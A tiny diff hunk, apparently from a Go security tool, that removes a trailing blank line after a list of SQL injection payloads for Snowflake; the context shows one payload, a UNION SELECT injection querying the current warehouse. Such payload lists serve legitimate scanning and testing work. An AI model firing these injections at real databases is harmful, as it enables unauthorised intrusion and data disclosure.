@@ -102,4 +102,3 @@ var Snowflake = PayloadGroup{
 		{Type: "deep", Content: "' UNION SELECT CURRENT_WAREHOUSE()--"},
 	},
 }
-
